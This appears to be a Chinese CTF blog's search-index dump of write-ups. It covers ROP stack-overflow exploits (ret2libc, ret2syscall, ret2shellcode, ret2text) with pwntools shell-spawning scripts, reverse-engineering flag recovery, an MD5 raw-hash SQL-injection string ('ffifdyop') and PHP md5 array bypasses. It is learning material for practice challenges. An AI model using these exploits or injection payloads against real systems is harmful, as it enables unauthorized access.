字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(\"/bin/sh\")。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下 ##!/usr/bin/env python from pwn import * sh = process('./ret2libc2') gets_plt = 0x08048460 system_plt = 0x08048490 pop_ebx = 0x0804843d buf2 = 0x804a080 payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]) sh.sendline(payload) sh.sendline('/bin/sh') sh.interactive() 需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。 ","date":"2023-09-23","objectID":"/articles/2023/09/pwn-rop-ret2libc-%E4%B8%AD%E7%BA%A7/:0:0","tags":["CTF","Pwn"],"title":"Pwn-ROP-ret2libc-中级","uri":"/articles/2023/09/pwn-rop-ret2libc-%E4%B8%AD%E7%BA%A7/"},{"categories":["Pwn"],"content":"ret2libc原理 ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(\"/bin/sh\")，故而此时我们需要知道 system 函数的地址。（当然同时还要知道字符串/bin/sh的地址） 实例 初级实例中，在plt段可以直接找到system函数，同时在.data段（准确的说是.rodata段）可以找到/bin/sh字符串 这里我们以 bamboofox 中 ret2libc1为例 点击下载: ret2libc1 首先，我们可以检查一下程序的安全保护 ➜ ret2libc1 checksec ret2libc1 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"RET2LIBC \u003e_\u003c\"); gets((char *)\u0026v4); return 0; } 可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在 ➜ ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh' Strings information ============================================================ 0x08048720 : /bin/sh 确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。 .plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND] 那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下 #!/usr/bin/env python from pwn import * sh = process('./ret2libc1') binsh_addr = 0x8048720 system_plt = 0x08048460 payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr]) sh.sendline(payload) sh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。 这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。 注意：如果开启了NX保护，题目中一般会给出system，无论是在libc中还是plt中还是text中，如果没开启NX保护，基本上需要自己写入shellcode ","date":"2023-09-23","objectID":"/articles/2023/09/pwn-rop-ret2libc-%E5%88%9D%E7%BA%A7/:0:0","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2libc-初级","uri":"/articles/2023/09/pwn-rop-ret2libc-%E5%88%9D%E7%BA%A7/"},{"categories":["Pwn"],"content":"原理 re to syscall，就是通过调用系统函数以达到getshell的目的。具体的说，让程序调用execve(\"/bin/sh\",0,0)从而getshell的过程。 步骤 必要条件： eax = 0xb ebx指向/bin/sh字符串的地址 ecx = 0 edx = 0 最后需要执行int 0x80终端达到execve(\"/bin/sh\",0,0)的目的 如何实现呢？ 我们知道，如果栈存在溢出，我们几乎存在整个栈的数据修改权。而为了修改寄存器的值，并且是利用栈修改寄存器的值。那么只有pop命令可以做到这件事情了。于是，我们利用pop后面接ret的函数段（gadget），对寄存器进行修改，并且实现连续跳转（ret）。 实例 这里我们以 bamboofox 中的 ret2syscall 为例 点击下载: ret2syscall 首先检测程序开启的保护 ➜ ret2syscall checksec rop Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 来查看源码 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"This time, no system() and NO SHELLCODE!!!\"); puts(\"What do you plan to do?\"); gets(\u0026v4); return 0; } 可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考 https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8 简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell execve(\"/bin/sh\",NULL,NULL) 其中，该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。 首先，我们来寻找控制 eax 的 gadgets ➜ ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。 类似的，我们可以得到控制其它寄存器的 gadgets ➜ ret2syscall ROPgadget --binary rop --only 'pop|ret' | grep 'ebx' 0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret 0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret 0x080be23f : pop ebx ; pop edi ; ret 0x0806eb69 : pop ebx ; pop edx ; ret 0x08092258 : pop ebx ; pop esi ; pop ebp ; ret 0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10 0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14 0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc 0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4 0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8 0x08048913 : pop ebx ; pop esi ; pop edi ; ret 0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4 0x08049a94 : pop ebx ; pop esi ; ret 0x080481c9 : pop ebx ; ret 0x080d7d3c : pop ebx ; ret 0x6f9 0x08099c87 : pop ebx ; ret 8 0x0806eb91 : pop ecx ; pop ebx ; ret 0x0806336b : pop edi ; pop esi ; pop ebx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret 0x0805c820 : pop esi ; pop ebx ; ret 0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0807b6ed : pop ss ; pop ebx ; ret 这里，我选择 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 这个可以直接控制其它三个寄存器。 此外，我们需要获得 /bin/sh 字符串对应的地址。 ➜ ret2syscall ROPgadget --binary rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh 可以找到对应的地址，此外，还有 int 0x80 的地址，如下 ➜ ret2syscall ROPgadget --binary rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 0x080938fe : int 0xbb 0x080869b5 : int 0xf6 0x0807b4d4 : int 0xfc Unique gadgets found: 4 同时，也找到对应的地址了。 下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。 from pwn import * context(arch = 'i386', os = 'linux') r = process(\"./rop\") pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 bin_sh_string ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2systemcall/:0:0","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2systemcall","uri":"/articles/2023/09/pwn-rop-ret2systemcall/"},{"categories":["Pwn"],"content":" 注意：在最新的版本中，ELF中.bss段已经不可执行，因此例题无法getshell，这里先记录原理，等遇见相似的题目再更新wp ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2shellcode/:0:0","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2shellcode","uri":"/articles/2023/09/pwn-rop-ret2shellcode/"},{"categories":["Pwn"],"content":"原理 ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。 ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2shellcode/:0:1","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2shellcode","uri":"/articles/2023/09/pwn-rop-ret2shellcode/"},{"categories":["Pwn"],"content":"例子 这里我们以 bamboofox 中的 ret2shellcode 为例 点击下载: ret2shellcode 首先检测程序开启的保护 ➜ ret2shellcode checksec ret2shellcode Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No system for you this time !!!\"); gets((char *)\u0026v4); strncpy(buf2, (const char *)\u0026v4, 0x64u); printf(\"bye bye ~\"); return 0; } 可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。 .bss:0804A080 public buf2 .bss:0804A080 ; char buf2[100] 这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。 gef➤ b main Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8. gef➤ r Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode Breakpoint 1, main () at ret2shellcode.c:8 8 setvbuf(stdout, 0LL, 2, 0LL); ─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]──── 6 int main(void) 7 { → 8 setvbuf(stdout, 0LL, 2, 0LL); 9 setvbuf(stdin, 0LL, 1, 0LL); 10 ─────────────────────────────────────────────────────────────────────[ trace ]──── [#0] 0x8048536 → Name: main() ───────────────────────────────────────────────────────────────────────────────────────────────────── gef➤ vmmap Start End Offset Perm Path 0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so 0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so 0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so 0xf7faf000 0xf7fb2000 0x00000000 rwx 0xf7fd3000 0xf7fd5000 0x00000000 rwx 0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar] 0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso] 0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffb000 0xf7ffc000 0x00000000 rwx 0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so 0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so 0xfffdd000 0xffffe000 0x00000000 rwx [stack] 通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限 0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。 具体的 payload 如下 #!/usr/bin/env python from pwn import * sh = process('./ret2shellcode') shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr)) sh.interactive() ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2shellcode/:0:2","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2shellcode","uri":"/articles/2023/09/pwn-rop-ret2shellcode/"},{"categories":["Pwn"],"content":"题目 sniperoj-pwn100-shellcode-x86-64 ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2shellcode/:0:3","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2shellcode","uri":"/articles/2023/09/pwn-rop-ret2shellcode/"},{"categories":["Pwn"],"content":"原理 ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。 这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。 ret2text适合.text中已经存在getshell代码的情况，总的来说就是将存在溢出的函数的ret劫持到getshell的程序中 实例 点击下载: ret2text 首先，查看一下程序的保护机制： 可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。 发现gets()处存在栈溢出漏洞。同时我们发现secure函数： 发现结尾调用了system(\"/bin/sh\")。同时发现在前面还有一个判断，虽然不知道判断是做什么用的，但是我们可以直接跳转到x0804863A处执行。 下面，我们寻找需要填充多少字符才能覆盖ret地址，这里使用cyclic工具： 让cyclic生成200个字符，我们将其输入程序，程序必定在ret处崩溃，看看此时的PC地址即可知道在何处覆盖地址： 说明cyclic生成的200个字符中的0x62616164字符被加载进PC，我们找到它在第几个位置： 也就是说，在填充112个字符后可以覆盖源地址，那么payload如下： from pwn import * sh = process('./ret2text') target = 0x804863a sh.sendline(b'A' * (112) + p32(target)) sh.interactive() 成功getshell ","date":"2023-09-22","objectID":"/articles/2023/09/pwn-rop-ret2text/:0:0","tags":["CTF","Pwn","二进制"],"title":"Pwn-ROP-ret2text","uri":"/articles/2023/09/pwn-rop-ret2text/"},{"categories":["Reverse"],"content":"快速找到程序入口 当函数列表中找不到main时，在Exports导出表中找到start入口。 ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:1:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"显示每条指令的字节码 Options-General-Disassembly 效果： ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:2:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"折叠长段变量声明 右键，Collapse declarations ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:3:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"重命名变量 右键，Rename（N） ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:4:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"查看交叉引用 右键，Jump to xref（X） ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:5:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"创建新结构体 View-Open subviews-Local types（Shift+F1） 右键Insert（Insert），按照C语法创建结构体。 对变量右键Set lvar type即可改变该变量的类型。 ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:6:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"将数字转化为字符（ascii） 右键-Char或者R键 ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:7:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"常见枚举（Enum） 右键-Enum 可以查看常见的枚举类型（比如EOF） ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:8:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"重新定义函数 右键undef（u释放定义） ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:9:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"标记为已处理完 右键-Mark As DeCompiled 持续更新………… ","date":"2023-09-18","objectID":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/:10:0","tags":["IDA","CTF","软件"],"title":"IDA快速上手","uri":"/articles/2023/09/ida%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"},{"categories":["Reverse"],"content":"0x01 查壳/脱壳 使用Die工具，发现是64位ELF，无壳。 ","date":"2023-09-17","objectID":"/articles/2023/09/xctf-666-reverse/:1:0","tags":["Reverse","CTF"],"title":"xctf-666-Reverse","uri":"/articles/2023/09/xctf-666-reverse/"},{"categories":["Reverse"],"content":"0x01 反编译 IDA64反编译结果如下，我们直接进入含有“flag{This_1s_f4cker_flag}”的函数： 生成伪代码： 这时发现flag{This_1s_f4cker_flag}显然是假的，而且根据以上的信息，我们要让s==enflag，而且s是和输入一起进行encode后得到的字符串。同时输入的字符串大小应该等于key，查看数据： 发现s经过处理后应该等于izwhroz\"“w\"v.K”.Ni，key=18。 ","date":"2023-09-17","objectID":"/articles/2023/09/xctf-666-reverse/:2:0","tags":["Reverse","CTF"],"title":"xctf-666-Reverse","uri":"/articles/2023/09/xctf-666-reverse/"},{"categories":["Reverse"],"content":"0x02 进入encode ecode函数的实现如下： int __fastcall encode(const char *a1, __int64 a2) { char v3[104]; // [rsp+10h] [rbp-70h] int v4; // [rsp+78h] [rbp-8h] int i; // [rsp+7Ch] [rbp-4h] i = 0; v4 = 0; if ( strlen(a1) != key ) return puts(\"Your Length is Wrong\"); for ( i = 0; i \u003c key; i += 3 ) { v3[i + 64] = key ^ (a1[i] + 6); v3[i + 33] = (a1[i + 1] - 6) ^ key; v3[i + 2] = a1[i + 2] ^ 6 ^ key; *(_BYTE *)(a2 + i) = v3[i + 64]; *(_BYTE *)(a2 + i + 1LL) = v3[i + 33]; *(_BYTE *)(a2 + i + 2LL) = v3[i + 2]; } return a2; } 通过阅读发现：a1其实就是要解的flag，a2是s字符串。我们此时要假定a2=izwhroz\"“w\"v.K”.Ni然后反解出a1来。 关键在于for循环，虽然其中很多代码，但是我们发现，其实v3数组只是一个中间量，而且它的值是通过计算得出的，那么我们此时可以将等号连接起来，建立起a1和a2之间直接的联系： *(_BYTE *)(a2 + i) = v3[i + 64] = key ^ (a1[i] + 6); *(_BYTE *)(a2 + i + 1LL) = v3[i + 33] = (a1[i + 1] - 6) ^ key; *(_BYTE *)(a2 + i + 2LL) = v3[i + 2] = a1[i + 2] ^ 6 ^ key; 继续简化： *(_BYTE *)(a2 + i) = key ^ (a1[i] + 6); *(_BYTE *)(a2 + i + 1LL) = (a1[i + 1] - 6) ^ key; *(_BYTE *)(a2 + i + 2LL) = a1[i + 2] ^ 6 ^ key; 其中，i = 0 to 18 step 3；而a2实际上要等于izwhroz\"“w\"v.K”.N。那么根据异或的性质，a = b ^ c则有b = a ^ c （由于c ^ c = 0，且0^x = x，那么两边同时异或c即可得到）,我们可以反解出a1： a1[i] = a2[i] ^ key - 6; a1[i + 1] = a2[i + 1] ^ key + 6; a1[i + 2] = a2[i + 2] ^ 6 ^ key; 那么构造循环即可解出。下面给出C++代码。 ","date":"2023-09-17","objectID":"/articles/2023/09/xctf-666-reverse/:3:0","tags":["Reverse","CTF"],"title":"xctf-666-Reverse","uri":"/articles/2023/09/xctf-666-reverse/"},{"categories":["Reverse"],"content":"0x03 Payload #include \u003ciostream\u003e #include \u003cstring\u003e using namespace std; string s = \"izwhroz\\\"\\\"w\\\"v.K\\\".Ni\"; char a1[18]; int main() { for (int i = 0;i \u003c 18;i += 3) { a1[i] = (s[i] ^ 18) - 6; a1[i + 1] = (s[i + 1] ^ 18) + 6; a1[i + 2] = (s[i + 2] ^ 6 ^ 18); } for (auto i : a1){ cout \u003c\u003c i; } return 0; } 得到答案： ","date":"2023-09-17","objectID":"/articles/2023/09/xctf-666-reverse/:4:0","tags":["Reverse","CTF"],"title":"xctf-666-Reverse","uri":"/articles/2023/09/xctf-666-reverse/"},{"categories":["Reverse"],"content":"0x00 题目概述 Reverse1 Reverse2 两题具有很高的相似程度，可以放在一起练习。（这里主要以Re2为例） ","date":"2023-09-17","objectID":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/:1:0","tags":["Reverse","CTF","网络安全"],"title":"Reverse入门2题","uri":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/"},{"categories":["Reverse"],"content":"0x01 查壳/脱壳 分析程序前的必备操作。使用Win下的Die分析： 无壳，直接进入IDA反编译 ","date":"2023-09-17","objectID":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/:2:0","tags":["Reverse","CTF","网络安全"],"title":"Reverse入门2题","uri":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/"},{"categories":["Reverse"],"content":"0x02 IDA反编译 这两题的相似点在于起点处有很多的分支或者嵌套函数，如果直接从函数起点分析将非常复杂。这里使用Shift+f12查找关键的字符串。 这里可以看到this is the right flag!很有可能就是flag所在处。 找到位置之后，使用x找到引用该字符串的位置，tab生成伪代码，如下所示： 根据分析，我们需要找到flag究竟是什么。点击flag找到flag变量所在的内存区域： 疑似字符串{hacking_for_fun}\\0（加上结尾的null18个字节）从1081到1092刚好18个字节，于是flag={hacking_for_fun} 此时再回去观察对flag的操作： for ( i = 0; i \u003c= strlen(\u0026flag); ++i ) // 对flag字符串进行处理 { if ( *(\u0026flag + i) == 105 || *(\u0026flag + i) == 114 ) *(\u0026flag + i) = 49; } 这里就很简单了，就是将flag中ascii等于105（i）和114（r）的转为49（1）即可。 最终答案为flag{hack1ng_fo1_fun} ","date":"2023-09-17","objectID":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/:3:0","tags":["Reverse","CTF","网络安全"],"title":"Reverse入门2题","uri":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/"},{"categories":["Reverse"],"content":"0x03 总结 这里看下Re1的题： 发现和re2一模一样。 这类题的关键是，主要函数隐藏较深，得使用字符串查找来寻找关键的内容所在处。逆向就得慢慢看才行。 ","date":"2023-09-17","objectID":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/:4:0","tags":["Reverse","CTF","网络安全"],"title":"Reverse入门2题","uri":"/articles/2023/09/reverse%E5%85%A5%E9%97%A82%E9%A2%98/"},{"categories":["Web"],"content":"0x01 md5注入 打开网页只给出这样一个输入框： 这里随便输入密码，发现网页GET传参password，但是尝试SQL注入无果。 于是使用Brupsuite尝试抓取相应包，发现提示： 考虑如下sql语句 $sql = \"select * from 'admin' where password = '\".md5($_GET[password],true).\"'\"; 于是尝试MD5下的sql注入。也就是想办法找到一个字符串，它的md5值转化为字符串（md5函数的第二个参数是true，则将16进制的哈希结果转化为字符串格式）可以闭合sql语句（也就是password=‘‘or’xxx’）并且恒为Ture。 这里提供一个别人构造好的字符串：ffifdyop \u003c?php $str = md5('ffifdyop'); echo $str; print(\"\\n\"); $str = md5(\"ffifdyop\",true); echo $str; ?\u003e 输入结果为 276f722736c95d99e921722cf9ed621c 'or'6�]��!r,��b ‘or’可以实现闭合。 输入ffifdyop，跳转至下一个网页。 ","date":"2023-09-17","objectID":"/articles/2023/09/bjdctf2020-easymd5-web/:1:0","tags":["PHP","CTF","Web"],"title":"BJDCTF2020-EasyMD5-Web","uri":"/articles/2023/09/bjdctf2020-easymd5-web/"},{"categories":["Web"],"content":"0x02 md5判断绕过 查看网页源码发现提示： 根据之前的文章：PHP中数组绕过的一些函数 | AlexanderZ.Tang (alextang.top)可知，当md5的第一个参数是数组时会返回null，而null==null，因此答案就是传入两个数组（注意这两个数组的值不能相同）。 levels91.php?a[]=1\u0026b[]=2 ","date":"2023-09-17","objectID":"/articles/2023/09/bjdctf2020-easymd5-web/:2:0","tags":["PHP","CTF","Web"],"title":"BJDCTF2020-EasyMD5-Web","uri":"/articles/2023/09/bjdctf2020-easymd5-web/"},{"categories":["Web"],"content":"0x03 POST传值 和上一节一模一样，只不过这次使用POST传递参数。payload将参数名字改一下就行。 param1[]=a\u0026param2[]=b 得到结果 ","date":"2023-09-17","objectID":"/articles/2023/09/bjdctf2020-easymd5-web/:3:0","tags":["PHP","CTF","Web"],"title":"BJDCTF2020-EasyMD5-Web","uri":"/articles/2023/09/bjdctf2020-easymd5-web/"},{"categories":["Web"],"content":"0x04 总结 这题的关键在于第一问，这个常用的md5万能密码应该记住。 ","date":"2023-09-17","objectID":"/articles/2023/09/bjdctf2020-easymd5-web/:4:0","tags":["PHP","CTF","Web"],"title":"BJDCTF2020-EasyMD5-Web","uri":"/articles/2023/09/bjdctf2020-easymd5-web/"},{"categories":["Misc"],"content":"0x01题目 题目是一个二维码 ","date":"2023-09-17","objectID":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/:1:0","tags":["CTF","Misc","WriteUp"],"title":"WP-SUSCTF招新题目-Misc","uri":"/articles/2023/09/wp-susctf%E6%8B%9B%E6%96%B0%E9%A2%98%E7%9B%AE-misc/"},{"categories":["Misc"],"content":"0x02 分析 扫码后发现二维码包含的信息如下： \\u58eb\\u4eba\\u0020\\u5927\\u571f\\u0020\\u5927\\u4eba\\u0020\\u4e2d\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u4eba\\u5de5\\u0020\\u592b\\u7f8a\\u0020\\u4e2d\\u7530\\u0020\\u592b\\u592b\\u0020\\u4eba\\u4eba\\u0020\\u4eba\\u7531\\u0020\\u5929\\u4eba\\u0020\\u4eba\\u53e3\\u0020\\u4e2d\\u4eba\\u0020\\u738b\\u5927\\u0020\\u4e2d\\u53e3\\u0020\\u592b\\u5927 立刻得知是Unicode编码，进行解密，得到一下中文： 士人 大土 大人 中口 中人 人工 夫羊 中田 夫夫 人人 人由 天人 人口 中人 王大 中口 夫大 此时立刻想到是当铺密码（看到这种两个三个的汉字组合，而且这些汉字大部分都含有“口”这样的结构，就是当铺密码）。当铺密码简单来说就是汉字中“出头”的笔画个数。例如：“中”就是2，“口”和“田”都是0（没有出头），“人”是3。以此类推。 